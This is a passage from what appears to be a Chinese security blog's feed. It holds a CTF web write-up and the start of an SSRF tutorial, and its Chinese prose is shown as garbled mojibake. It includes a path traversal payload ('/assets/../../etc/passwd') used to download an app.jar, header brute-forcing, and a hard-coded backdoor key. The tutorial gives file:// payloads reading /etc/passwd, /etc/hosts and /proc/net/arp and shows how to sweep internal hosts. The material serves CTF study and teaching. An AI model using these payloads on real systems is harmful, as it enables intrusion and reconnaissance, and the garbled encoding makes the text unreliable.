class="hljs-number">127.0.0.1</span><br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250521194020766.png" alt="image-20250521194020766"></p><p>çœ‹æºç ï¼Œä¼šå‘ç°æœ‰<code>authentication </code>è®¤è¯ï¼Œæ˜¯<code>X-Internal-Auth</code>ï¼Œ<code>getflag</code>æ˜¯è®¿é—®<code>/admin/flag</code></p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250521194505342.png" alt="image-20250521194505342"></p><p>ç›´æ¥bpæŠ“åŒ…</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250521194926072.png" alt="image-20250521194926072"></p><p>æ”¾åˆ°<code>Intruder</code>ä¸­çˆ†ç ´å‡ºæ­£ç¡®çš„<code>X-Internal-Auth</code>ï¼Œæ‰‹åŠ¨åŠ ä¸Šè¿™ä¸ªè¯·æ±‚å¤´ä¸payload</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250521195049079.png" alt="image-20250521195049079"></p><p>æˆåŠŸçˆ†ç ´å‡ºæ˜¯123</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250521195228885.png" alt="image-20250521195228885"></p><h1 id="ezblog"><a href="#ezblog" class="headerlink" title="ezblog"></a>ezblog</h1><p>ä½¿ç”¨åç¼–è¯‘å·¥å…·æŸ¥çœ‹é™„ä»¶æºç ï¼Œåœ¨<code>dashboard.class</code>ä¸­çœ‹åˆ°æœ‰ä¸€ä¸ª<code>/backdoor</code>è·¯ç”±ï¼Œæ»¡è¶³ä¼ å‚<code>key</code>ç­‰äºæ­£ç¡®çš„<code>key</code>å³å¯è·å–flag</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250521201332033.png" alt="image-20250521201332033"></p><p>ç„¶åæ˜¯<code>app.class</code>æ–‡ä»¶ï¼Œè¿™é‡Œè®¾ç½®äº†<code>assets</code>çš„ç›®å½•ä¸º<code>/app/assets</code></p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250521202235881.png" alt="image-20250521202235881"></p><p>ç‚¹å‡»<code>FileStaticRepository</code>è·³è½¬åˆ°<code>FileStaticRepository.class</code>æ–‡ä»¶</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250521202631294.png" alt="image-20250521202631294"></p><p>å¯ä»¥çœ‹åˆ°è¿™æ®µä»£ç </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> URL <span class="hljs-title function_">find</span><span class="hljs-params">(String relativePath)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">File</span> <span class="hljs-variable">file</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(location, relativePath);<br><br>        <span class="hljs-keyword">if</span> (file.exists()) &#123;<br>            <span class="hljs-keyword">return</span> file.toURI().toURL();<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ä¸Šä¸€ä¸ªæ–‡ä»¶çŸ¥é“äº†<code>assets</code>çš„ç›®å½•ä¸º<code>/app/assets</code>ï¼Œå¦‚æœåœ¨åé¢æ·»åŠ <code>../../etc/passwd</code>ï¼Œæœ€åå°±ä¼šå¾—åˆ°<code>/etc/passwd</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment"># è®¿é—®ç½‘ç«™</span><br>http:<span class="hljs-comment">//challenge.qsnctf.com:31555/assets/../../etc/passwd</span><br><span class="hljs-comment"># è¿”å›å†…å®¹</span><br>http:<span class="hljs-comment">//challenge.qsnctf.com:31555/etc/passwd</span><br></code></pre></td></tr></table></figure><p>è®¿é—®<code>/assets/..</code>å¯ä»¥å¾—åˆ°ä¸Šçº§ç›®å½•æ–‡ä»¶ï¼Œä¼šå‘ç°æœ‰ä¸ª<code>app.jar</code>æ–‡ä»¶ï¼Œè¿™å°±æ˜¯çœŸæ­£çš„<code>app.jar</code>æ–‡ä»¶</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522104806394.png" alt="image-20250522104806394"></p><p>é€šè¿‡è®¿é—®<code>/assets/../app.jar</code>ï¼Œå°±å¯ä»¥è·å–<code>/app</code>ä¸‹çš„<code>app.jar</code>æ–‡ä»¶</p><p>å…ˆæŠ“åŒ…ä¿®æ”¹æˆè®¿é—®<code>/assets/../app.jar</code></p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522105757109.png" alt="image-20250522105757109"></p><p>æ”¹å¥½ä¹‹åç›´æ¥æ”¾åŒ…ï¼Œå°±å¯ä»¥ä¸‹è½½åˆ°<code>app.jar</code>æ–‡ä»¶äº†</p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522105903757.png" alt="image-20250522105903757"></p><p>å°†ä¸‹è½½å¾—åˆ°çš„æ–‡ä»¶ç”¨å·¥å…·åç¼–è¯‘æ‰“å¼€ï¼Œå¯ä»¥åœ¨<code>dashboard.class</code>æ‰¾åˆ°<code>realkey</code>ä¸º<code>NlRVANA@007</code></p><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522105949967.png" alt="image-20250522105949967"></p><p>æœ€åå°±æ˜¯è®¿é—®<code>/backdoor</code>è·¯ç”±ï¼Œç„¶åGETä¼ å‚<code>key</code>ä¸º<code>NlRVANA@007</code></p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">/backdoor?<span class="hljs-attribute">key</span>=NlRVANA@007<br></code></pre></td></tr></table></figure><p><img src="/2025/05/22/%E7%AC%AC%E4%BA%8C%E5%B1%8A%E5%B8%95%E9%B2%81%E6%9D%AFweb%E5%A4%8D%E7%8E%B0/image-20250522110141998.png" alt="image-20250522110141998"></p><h1 id="CatShell"><a href="#CatShell" class="headerlink" title="CatShell"></a>CatShell</h1><p>æˆ‘å¤ªèœäº†ï¼Œä¸ä¼šåšã€‚ã€‚ã€‚</p>]]></content>
    
    
    <categories>
      
      <category>æ¯”èµ›å¤ç°</category>
      
    </categories>
    
    
    <tags>
      
      <tag>æ¯”èµ›å¤ç°</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>SSRFå­¦ä¹ </title>
    <link href="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/"/>
    <url>/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<p><strong>å­¦ä¹ ç½‘ç«™</strong></p><blockquote><p>**æ©™å­ç§‘æŠ€ï¼š**<a href="https://www.bilibili.com/video/BV1iQ4y1u7Pt/?spm_id_from=333.1387.homepage.video_card.click&vd_source=525a280615063349bad5e187f6bfeec3">https://www.bilibili.com/video/BV1iQ4y1u7Pt/?spm_id_from=333.1387.homepage.video_card.click&amp;vd_source=525a280615063349bad5e187f6bfeec3</a></p><p>**é¶åœºï¼š**<a href="http://121.43.53.23:9091/">http://121.43.53.23:9091/</a></p></blockquote><h1 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h1><h2 id="NAT"><a href="#NAT" class="headerlink" title="NAT"></a>NAT</h2><h3 id="ä»€ä¹ˆæ˜¯NAT"><a href="#ä»€ä¹ˆæ˜¯NAT" class="headerlink" title="ä»€ä¹ˆæ˜¯NAT"></a>ä»€ä¹ˆæ˜¯NAT</h3><p>NATï¼ˆNetwork Address Translationï¼‰ï¼šç½‘ç»œåœ°å€è½¬æ¢ï¼Œæ˜¯ä¸€ç§å°†ç§æœ‰ï¼ˆä¿ç•™ï¼‰åœ°å€è½¬åŒ–ä¸ºåˆæ³• IP åœ°å€çš„è½¬æ¢æŠ€æœ¯ï¼Œé€šè¿‡å°†ä¸€ä¸ªå¤–éƒ¨ IP åœ°å€å’Œç«¯å£æ˜ å°„åˆ°æ›´å¤§çš„å†…éƒ¨ IP åœ°å€æ¥è½¬æ¢ IP åœ°å€</p><p><strong>å°±æ˜¯å¯ä»¥å°†å†…ç½‘ IP è½¬æ¢æˆå…¬ç½‘ IPï¼Œä¹Ÿå¯ä»¥è¿›è¡Œç«¯å£æ˜ å°„</strong></p><h1 id="åˆè¯†SSRF"><a href="#åˆè¯†SSRF" class="headerlink" title="åˆè¯†SSRF"></a>åˆè¯†SSRF</h1><h2 id="ä»€ä¹ˆæ˜¯SSRF"><a href="#ä»€ä¹ˆæ˜¯SSRF" class="headerlink" title="ä»€ä¹ˆæ˜¯SSRF"></a>ä»€ä¹ˆæ˜¯SSRF</h2><p>SSRFï¼ˆServer - Side Request Forgeryï¼‰ï¼Œä¹Ÿå°±æ˜¯æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ã€‚ç®€å•æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ç§å®‰å…¨æ¼æ´ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™ä¸ªæ¼æ´è®©æœåŠ¡å™¨å»è®¿é—®æ”»å‡»è€…æŒ‡å®šçš„å…¶ä»–ç½‘ç»œèµ„æºã€‚å°±å¥½åƒæ”»å‡»è€…æ‰¾åˆ°äº†æœåŠ¡å™¨çš„ä¸€ä¸ª â€œå°è·Ÿç­â€ï¼Œèƒ½è®©è¿™ä¸ª â€œå°è·Ÿç­â€ï¼ˆæœåŠ¡å™¨ï¼‰æŒ‰ç…§è‡ªå·±çš„æ„æ„¿å»è·å–åˆ«çš„åœ°æ–¹çš„ä¿¡æ¯ã€‚</p><p><strong>æœ¬è´¨ä¸Šæ˜¯å±äºä¿¡æ¯æ³„éœ²æ¼æ´</strong></p><p>ä¸¾ä¾‹ç†è§£ï¼š</p><p>æƒ³è±¡æœåŠ¡å™¨æ˜¯ä¸€ä¸ªæœ‰ä¸¥æ ¼é—¨ç¦çš„å…¬å¸å¤§æ¥¼ï¼Œæ­£å¸¸æƒ…å†µä¸‹ï¼Œå®ƒåªä¼šå’Œç»è¿‡æˆæƒçš„åˆä½œä¼™ä¼´ï¼ˆæ­£å¸¸çš„ç½‘ç»œèµ„æºï¼‰äº¤æµã€‚ä½†æ˜¯å› ä¸ºæœ‰ SSRF æ¼æ´ï¼Œæ”»å‡»è€…å°±åƒä¸€ä¸ªç‹¡çŒ¾çš„éª—å­ï¼Œé€šè¿‡æŸç§æ‰‹æ®µï¼ˆæ¼æ´ï¼‰ï¼Œè®©å¤§æ¥¼é‡Œçš„å·¥ä½œäººå‘˜ï¼ˆæœåŠ¡å™¨ï¼‰æŒ‰ç…§è‡ªå·±çš„æŒ‡ç¤ºï¼Œå»è®¿é—®ä¸€äº›æœªç»æˆæƒçš„åœ°æ–¹ï¼ˆå…¶ä»–ç½‘ç»œèµ„æºï¼‰ã€‚</p><h2 id="SSRFçš„æˆå› "><a href="#SSRFçš„æˆå› " class="headerlink" title="SSRFçš„æˆå› "></a>SSRFçš„æˆå› </h2><p>å¤§éƒ¨åˆ†æ˜¯ç”±äºæœåŠ¡ç«¯æä¾›äº†ä»å…¶ä»–æœåŠ¡å™¨åº”ç”¨è·å–æ•°æ®çš„åŠŸèƒ½ï¼Œä¸”æ²¡æœ‰å¯¹ç›®æ ‡åœ°å€åšè¿‡æ»¤ä¸é™åˆ¶</p><h2 id="å¯èƒ½å‡ºç°SSRFçš„åœ°æ–¹"><a href="#å¯èƒ½å‡ºç°SSRFçš„åœ°æ–¹" class="headerlink" title="å¯èƒ½å‡ºç°SSRFçš„åœ°æ–¹"></a>å¯èƒ½å‡ºç°SSRFçš„åœ°æ–¹</h2><ul><li>ä»æŒ‡å®šURLåœ°å€è·å–ç½‘é¡µæ–‡æœ¬å†…å®¹</li><li>åŠ è½½æŒ‡å®šåœ°å€çš„å›¾ç‰‡ï¼Œä¸‹è½½</li><li>ç™¾åº¦è¯†å›¾ï¼Œç»™å‡ºä¸€ä¸²URLå°±èƒ½è¯†åˆ«å‡ºå›¾ç‰‡</li></ul><h2 id="SSRFæ”»å‡»æ–¹å¼"><a href="#SSRFæ”»å‡»æ–¹å¼" class="headerlink" title="SSRFæ”»å‡»æ–¹å¼"></a>SSRFæ”»å‡»æ–¹å¼</h2><p>å€ŸåŠ©ä¸»æœºAæ¥å‘èµ·SSRFæ”»å‡»ï¼Œé€šè¿‡ä¸»æœºAå‘ä¸»æœºBå‘èµ·è¯·æ±‚ï¼Œä»è€Œè·å–ä¸»æœºBçš„ä¸€äº›ä¿¡æ¯</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422215816202.png" alt="image-20250422215816202"></p><h1 id="SSRFæ¼æ´åˆ©ç”¨"><a href="#SSRFæ¼æ´åˆ©ç”¨" class="headerlink" title="SSRFæ¼æ´åˆ©ç”¨"></a>SSRFæ¼æ´åˆ©ç”¨</h1><h3 id="åˆ©ç”¨è¿‡ç¨‹"><a href="#åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="åˆ©ç”¨è¿‡ç¨‹"></a>åˆ©ç”¨è¿‡ç¨‹</h3><ul><li>é€šè¿‡æœåŠ¡å™¨Aï¼ˆSSRFæœåŠ¡å™¨ï¼‰è®¿é—®Aæ‰€åœ¨å†…ç½‘çš„å…¶ä»–æœåŠ¡å™¨ã€‚</li><li>ç”±SSRFæœåŠ¡å™¨å‘é€httpä¼ªåè®®è¿æ¥ç»™BæœåŠ¡å™¨</li><li>BæœåŠ¡å™¨å›å¤åˆ°SSRFæœåŠ¡å™¨</li><li>SSRFæœåŠ¡å™¨æ”¶åˆ°å›å¤åä¼šæ˜¾ç¤ºå†…å®¹</li></ul><h2 id="åˆ©ç”¨æ¡ˆä¾‹"><a href="#åˆ©ç”¨æ¡ˆä¾‹" class="headerlink" title="åˆ©ç”¨æ¡ˆä¾‹"></a>åˆ©ç”¨æ¡ˆä¾‹</h2><ul><li>åˆ©ç”¨fileåè®®è¯»å–æœ¬åœ°æ–‡ä»¶</li><li>å¯¹æœåŠ¡å™¨æ‰€åœ¨å†…ç½‘ã€æœ¬åœ°è¿›è¡Œç«¯å£æ‰«æï¼Œè·å–ä¸€äº›æœåŠ¡çš„bannerä¿¡æ¯</li><li>æ”»å‡»è¿è¡Œåœ¨å†…ç½‘æˆ–æœ¬åœ°çš„åº”ç”¨ç¨‹åº</li><li>å¯¹å†…ç½‘webåº”ç”¨è¿›è¡ŒæŒ‡çº¹è¯†åˆ«ï¼Œè¯†åˆ«ä¼ä¸šå†…éƒ¨çš„èµ„äº§ä¿¡æ¯</li><li>æ”»å‡»å†…å¤–ç½‘çš„webåº”ç”¨ï¼Œä¸»è¦æ˜¯ä½¿ç”¨HTTP GETè¯·æ±‚å°±å¯ä»¥å®ç°çš„æ”»å‡»</li></ul><h1 id="SSRFå­¦ä¹ "><a href="#SSRFå­¦ä¹ " class="headerlink" title="SSRFå­¦ä¹ "></a>SSRFå­¦ä¹ </h1><h2 id="ä»¥ç”¨SSRFæ‰“å†…ç½‘çš„æµç¨‹æ·±å…¥å­¦ä¹ "><a href="#ä»¥ç”¨SSRFæ‰“å†…ç½‘çš„æµç¨‹æ·±å…¥å­¦ä¹ " class="headerlink" title="ä»¥ç”¨SSRFæ‰“å†…ç½‘çš„æµç¨‹æ·±å…¥å­¦ä¹ "></a>ä»¥ç”¨SSRFæ‰“å†…ç½‘çš„æµç¨‹æ·±å…¥å­¦ä¹ </h2><h4 id="ä¼ªåè®®"><a href="#ä¼ªåè®®" class="headerlink" title="ä¼ªåè®®"></a>ä¼ªåè®®</h4><table><thead><tr><th>ä¼ªåè®®</th><th>ä½œç”¨</th></tr></thead><tbody><tr><td><code>file://</code></td><td>ä»æ–‡ä»¶ç³»ç»Ÿä¸­è·å–æ–‡ä»¶å†…å®¹ï¼Œå¦‚<code>file:///etc/passwd</code></td></tr><tr><td><code>dict://</code></td><td>å­—å…¸æœåŠ¡åè®®ï¼Œè®¿é—®å­—å…¸èµ„æºï¼Œå¦‚ <code>dict:///ip:6739/info:</code></td></tr><tr><td><code>ftp://</code></td><td>å¯ç”¨äºç½‘ç»œç«¯å£æ‰«æï¼ˆæ•ˆç‡ä½ä¸€ç‚¹ï¼‰</td></tr><tr><td><code>sftp://</code></td><td>SSHæ–‡ä»¶ä¼ è¾“åè®®æˆ–å®‰å…¨æ–‡ä»¶ä¼ è¾“åè®®</td></tr><tr><td><code>ldap://</code></td><td>è½»é‡çº§ç›®å½•è®¿é—®åè®®</td></tr><tr><td><code>tftp://</code></td><td>ç®€å•æ–‡ä»¶ä¼ è¾“åè®®</td></tr><tr><td><code>gopher://</code></td><td>åˆ†å¸ƒå¼æ–‡æ¡£ä¼ é€’æœåŠ¡</td></tr></tbody></table><h3 id="SSRFä¿¡æ¯æ”¶é›†â€“fileä¼ªåè®®â€“æŸ¥æ‰¾å†…ç½‘å­˜æ´»ä¸»æœº"><a href="#SSRFä¿¡æ¯æ”¶é›†â€“fileä¼ªåè®®â€“æŸ¥æ‰¾å†…ç½‘å­˜æ´»ä¸»æœº" class="headerlink" title="SSRFä¿¡æ¯æ”¶é›†â€“fileä¼ªåè®®â€“æŸ¥æ‰¾å†…ç½‘å­˜æ´»ä¸»æœº"></a>SSRFä¿¡æ¯æ”¶é›†â€“<code>file</code>ä¼ªåè®®â€“æŸ¥æ‰¾å†…ç½‘å­˜æ´»ä¸»æœº</h3><p>**ä½œç”¨ï¼š**ä»æ–‡ä»¶ç³»ç»Ÿä¸­è·å–æ–‡ä»¶å†…å®¹</p><p><strong>æ ¼å¼ï¼š</strong><code>file://[æ–‡ä»¶è·¯å¾„]</code></p><p><strong>ä¸¾ä¾‹ï¼š</strong></p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">file</span>:<span class="hljs-comment"><span class="hljs-doctag">///</span>etc/passwdè¯»å–æ–‡ä»¶passwd</span><br><span class="hljs-keyword">file</span>:<span class="hljs-comment">//etc/hostsæ˜¾ç¤ºå½“å‰æ“ä½œç³»ç»Ÿç½‘å¡çš„IP</span><br><span class="hljs-keyword">file</span>:<span class="hljs-comment"><span class="hljs-doctag">///</span>proc/net/arpæ˜¾ç¤ºarpç¼“å­˜è¡¨ï¼ˆå¯»æ‰¾å†…ç½‘å…¶ä»–ä¸»æœºï¼‰</span><br><span class="hljs-keyword">file</span>:<span class="hljs-comment"><span class="hljs-doctag">///</span>proc/net/fib_trieæ˜¾ç¤ºå½“å‰ç½‘æ®µè·¯ç”±ä¿¡æ¯</span><br></code></pre></td></tr></table></figure><h4 id="æŸ¥æ‰¾å†…ç½‘å­˜æ´»ä¸»æœº"><a href="#æŸ¥æ‰¾å†…ç½‘å­˜æ´»ä¸»æœº" class="headerlink" title="æŸ¥æ‰¾å†…ç½‘å­˜æ´»ä¸»æœº"></a>æŸ¥æ‰¾å†…ç½‘å­˜æ´»ä¸»æœº</h4><p>å¦‚ä¸‹é¡µé¢ï¼Œå¯ä»¥ä½¿ç”¨<code>file://</code>ä¼ªåè®®è¯»å–ä»»æ„æ–‡ä»¶</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>passwd<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422214441451.png" alt="image-20250422214441451"></p><p>å¯ä»¥æˆåŠŸè¯»å–åˆ°æ–‡ä»¶ï¼Œå°±å¯ä»¥æ€€ç–‘è¿™ä¸ªé¡µé¢å­˜åœ¨SSRFæ¼æ´</p><p>ç„¶åç¬¬ä¸€ä¸ªè¦è€ƒè™‘çš„å°±æ˜¯è¿™å°ä¸»æœºæ‰€å¤„çš„å†…ç½‘ç½‘æ®µæ˜¯å¤šå°‘ï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨<code>file://</code>ä¼ªåè®®è¯»å–æ–‡ä»¶è¿›è¡ŒæŸ¥çœ‹å½“å‰è¿™å°å­˜åœ¨SSRFæ¼æ´çš„ä¸»æœºçš„ IP è·å–</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422215024277.png" alt="image-20250422215024277"></p><p>å¯ä»¥çœ‹åˆ°æœ‰ä¸¤ä¸ª IPï¼Œè¿™è¡¨æ˜å½“å‰è¿™ä¸ªæœåŠ¡å™¨å­˜åœ¨ä¸¤ä¸ªç½‘å¡ï¼Œä¸€ä¸ªç½‘å¡åœ¨<code>172.251.251.2</code>è¿™ä¸ªç½‘æ®µï¼Œå¦ä¸€ä¸ªç½‘å¡åœ¨<code>172.250.250.2</code>è¿™ä¸ªç½‘æ®µ</p><p>ç„¶åæˆ‘ä»¬è¿˜å¯ä»¥ç»§ç»­è·å–<code>ARP</code>ç¼“å­˜è¡¨ï¼Œå¯»æ‰¾å†…ç½‘å…¶ä»–ä¸»æœº</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">file:<span class="hljs-regexp">//</span><span class="hljs-regexp">/proc/</span>net/arp<br></code></pre></td></tr></table></figure><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422221329788.png" alt="image-20250422221329788"></p><p>åªè¯»åˆ°äº†ä¸‰ä¸ªç½‘ç«™ï¼Œä½†æ˜¯è¿™ä¸ä»£è¡¨æ˜¯æ‰€æœ‰çš„ä¸»æœºï¼Œåªæ˜¯å½“å‰å·²ç»ä½¿ç”¨<code>ARP</code>åè®®ç¼“å­˜è¿‡çš„</p><p>å¯ä»¥ä½¿ç”¨<code>ARP</code>åè®®æ‰«æå†…ç½‘ï¼Œå¥½å¤„æ˜¯ä¸å…³å¿ƒå¯¹æ–¹æœåŠ¡å™¨å¼€æ²¡å¼€é˜²ç«å¢™æˆ–å¼€äº†ä»€ä¹ˆç­–ç•¥ï¼Œåªè¦æ˜¯å·¥ä½œåœ¨ IP åè®®çš„ä¸€ä¸ªæœåŠ¡å™¨ï¼Œéƒ½å¯ä»¥ä½¿ç”¨<code>ARP</code>åè®®æ‰«æå‡ºæ¥</p><p>**ä»€ä¹ˆæ˜¯<code>ARP</code>ç¼“å­˜è¡¨ï¼š**ARP ç¼“å­˜è¡¨æ˜¯ä¸»æœºç”¨äºç¼“å­˜ IP åœ°å€ä¸ MAC åœ°å€æ˜ å°„å…³ç³»çš„è¡¨ï¼Œåªæœ‰ä¸å…¶è¿›è¡Œé€šä¿¡æ‰ä¼šæœ‰è¿™ä¸ª<code>ARP</code>è¡¨</p><p><strong>æ‰€ä»¥å¯ä»¥é€šè¿‡SSRFæ¼æ´å»è®¿é—®å†…ç½‘é‡Œçš„æ‰€æœ‰ IPï¼Œå¦‚æœä¸»æœºå­˜æ´»å°±ä¼šè¢«è®°å½•åœ¨<code>ARP</code>ç¼“å­˜è¡¨ä¸­ï¼Œç„¶åä½¿ç”¨<code>file://</code>ä¼ªåè®®å»è¯»å–<code>/proc/net/arp</code>å°±å¯ä»¥çŸ¥é“æœ‰å“ªäº›ä¸»æœºæ˜¯å­˜æ´»çš„</strong></p><p>å¦‚ï¼šé€šè¿‡SSRFæ¼æ´å»è®¿é—®<code>http://172.250.250.6/</code>è¿™ä¸ªç½‘æ®µï¼Œå½“å‰çš„SSRFæœåŠ¡å™¨å°±ä¼šå»å°è¯•è®¿é—®è¿™ä¸ªç½‘ç«™ï¼Œä¸å…¶è¿›è¡Œé€šä¿¡ï¼Œä½†æ˜¯åœ¨ä¸å…¶è¿›è¡Œé€šä¿¡ä¹‹å‰ï¼Œè¿™ä¸ªSSRFæœåŠ¡å™¨ä¼šå…ˆå‘é€ä¸€ä¸ª ARP è¯·æ±‚ç»™è¦è®¿é—®çš„ç½‘ç«™ï¼Œç„¶åç›®æ ‡ç½‘ç«™ä¸ç®¡æœ‰æ²¡æœ‰å¼€é˜²ç«å¢™éƒ½ä¼šæœ‰ä¸€ä¸ªç®€å•çš„åº”ç­”</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422221309490.png" alt="image-20250422221309490"></p><p>ç„¶åå†æ­¤è¯»å–<code>ARP</code>ç¼“å­˜è¡¨ï¼Œå°±ä¼šå‘ç°å¤šå‡ºäº†åˆšæ‰è®¿é—®çš„ç½‘ç«™</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422221423498.png" alt="image-20250422221423498"></p><p>è¦äººå·¥å»ä¸€ä¸ªä¸ªè®¿é—®ç½‘ç«™å¤ªéº»çƒ¦ï¼Œå¯ä»¥ä½¿ç”¨<code>BurpSuite</code>å»è®¿é—®æ‰€æœ‰åœ°å€</p><p>é¦–å…ˆä½¿ç”¨bpè¿›è¡Œä¸€æ¬¡æŠ“åŒ…</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422222040263.png" alt="image-20250422222040263"></p><p>å°†æŠ“åˆ°çš„è¯·æ±‚åŒ…å‘é€åˆ°</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422222305099.png" alt="image-20250422222305099"></p><p>ç„¶ååœ¨payloadä¸­é€‰æ‹©ç±»å‹ä¸ºæ•°å€¼ï¼Œå®šä¹‰å¥½èŒƒå›´æ˜¯1åˆ°254ï¼Œæ­¥é•¿ä¸º1</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422222452166.png" alt="image-20250422222452166"></p><p>æ¥ç€å°±å¯ä»¥å¼€å§‹æ”»å‡»äº†</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422222825575.png" alt="image-20250422222825575"></p><p>æœ€åå†å»è¯»å–<code>ARP</code>ç¼“å­˜è¡¨å¾—åˆ°æ‰«æçš„ç»“æœ</p><p><img src="/2025/05/09/SSRF%E5%AD%A6%E4%B9%A0/image-20250422223008991.png" alt="image-20250422223008991"></p><p>ä¼šå‘ç°æœ‰çš„ä¸å­˜æ´»çš„ä¸»æœºä¹Ÿåœ¨é‡Œé¢ï¼Œå¯ä»¥æ ¹æ®<code>HW address</code>è¿›è¡ŒåŒºåˆ†ï¼Œå¦‚æœè¿™éƒ¨åˆ†ä¸å…¨æ˜¯00çš„ï¼Œå°±æ˜¯å­˜æ´»çš„ï¼Œå¦‚æœå…¨æ˜¯00ï¼Œå°±æ˜¯ä¸å­˜æ´»ï¼Œä¸º0çš„æ„æ€å°±æ˜¯å‘å…¶å‘é€çš„ ARP è¯·æ±‚ï¼Œä½†æ˜¯ç›®æ ‡ä¸»æœºå¹¶æ²¡æœ‰åº”ç­”ï¼Œæ‰€ä»¥è¯¥ä¸»æœºæ˜¯æ²¡æœ‰å­˜æ´»çš„</p><h3 id="SSRFä¿¡æ¯æ”¶é›†â€“dictä¼ªåè®®â€“æŸ¥æ‰¾å†…ç½‘ä¸»æœºå¼€æ”¾ç«¯å£"><a href="#SSRFä¿¡æ¯æ”¶é›†â€“dictä¼ªåè®®â€“æŸ¥æ‰¾å†…ç½‘ä¸»æœºå¼€æ”¾ç«¯å£" class="headerlink" 